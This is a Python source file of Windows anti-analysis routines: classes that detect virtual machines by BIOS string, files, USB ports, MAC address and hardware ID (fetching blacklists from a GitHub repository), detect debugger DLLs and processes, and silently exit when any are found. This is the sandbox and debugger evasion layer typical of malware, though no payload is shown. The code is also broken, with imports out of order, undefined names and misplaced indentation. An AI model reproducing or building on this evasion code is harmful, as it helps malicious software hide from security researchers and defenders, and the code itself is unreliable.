import random
import time
import psutil
import ctypes
import platform
import os
import platform
if platform.system() != "Windows":  sys.exit()
import sys
import re
import uuid
import wmi
import requests
import subprocess
import urllib3
from ctypes import *
import os

class AntiVM:

    def __init__(self):
        self.known_vms = ['VirtualBox', 'VMware', 'QEMU']
        

    def check_bios(self):
        bios_info = platform.uname()
        if any(vm in bios_info for vm in self.known_vms):
            #print("Virtual machine detected via BIOS")
            exit(0)

    def check_files(self):
        vm_files = ['VBoxGuestAdditions.iso', 'vmware.hv', 'qemu-ga']
        for f in vm_files:
            if os.path.exists(f):
                #print("Virtual machine file detected: " + f) 
                exit(0)

    def check_usbport(self):
        if len(w.Win32_PortConnector()) == 0:
            print("sus usbport")
            exit(0)
    

    def check_mac(self):
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        macs = request('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
        if mac[:8] in macs:
            print("is vm bc of mac")
            exit(0)

    def check_hwid(self):
        uuid = w.Win32_ComputerSystemProduct()[0].UUID
        uuids = request('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
        if uuid in uuids: 
            print("is vm bc of hwid / uuid")
            exit(0)


class AntiDLL:
    
    def __init__(self):
        self.bad_dlls = ['ollydbg.dll', 'Filemon.dll', 'ida.dll']

    def check_modules(self):
        modules = psutil.Process().memory_maps()
        for module in modules:
            if any(bad in str(module) for bad in self.bad_dlls):
                #print("Suspicious DLL module found: " + str(module))
                exit(0)

class AntiAnalysis:

    def __init__(self):
        pass

    def sleep_randomly(self):
       time.sleep(random.randint(1, 8))

    def check_debuggers(self):
        if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
            #print("Debugger detected!")
            exit(0)
        elif windll.kernel32.CheckRemoteDebuggerPresent(windll.kernel32.GetCurrentProcess(), False) != 0:
            exit(0)

    

            tools = ["ida64.exe", "idaq64.exe", "idaq.exe", "idaw64.exe", "idaw.exe", "idau64.exe", 
                    "idau.exe", "idat64.exe", "idat.exe", "idawow64.exe", "idawow.exe", "ollydbg.exe",
                    "ImmunityDebugger.exe", "Wireshark.exe"]
                
        for proc in psutil.process_iter():
            if proc.name().lower() in tools:
                #print("Debugger/tool detected:", proc.name())
                exit(0)


